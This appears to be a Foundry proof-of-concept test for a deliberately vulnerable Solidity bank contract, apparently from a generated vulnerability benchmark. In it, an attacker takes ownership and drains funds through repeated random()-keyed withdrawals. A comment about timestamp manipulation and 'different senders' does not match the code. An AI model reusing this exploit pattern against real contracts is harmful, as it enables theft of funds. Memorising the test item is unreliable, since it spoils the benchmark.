// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./basetest.sol";
import "../src/5efeb9b3-7ea9-49ce-abf9-e297992d533f_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);
    address receiver;

    function setUp() public {
        target = new VulnerableBank();
        receiver = address(new Receiver());
        vm.deal(attacker, 10 ether);
        vm.prank(attacker);
        target.transferOwnership(receiver);
    }

    function testExploit() public balanceLog {
        for (uint256 i = 0; i < 10; ++i) {
            vm.startPrank(attacker);
            uint256 prn = target.random();
            target.withdraw(prn);
            vm.stopPrank();

            // Ensure the attacker can control or manipulate the block timestamp
            // for strategic advantage, which is demonstrated by rapidly calling random() with different senders
        }

        assertEq(address(receiver).balance, 1 ether); // Assuming the receiver has a fallback function
    }
}

contract Receiver {
    receive() external payable {}
}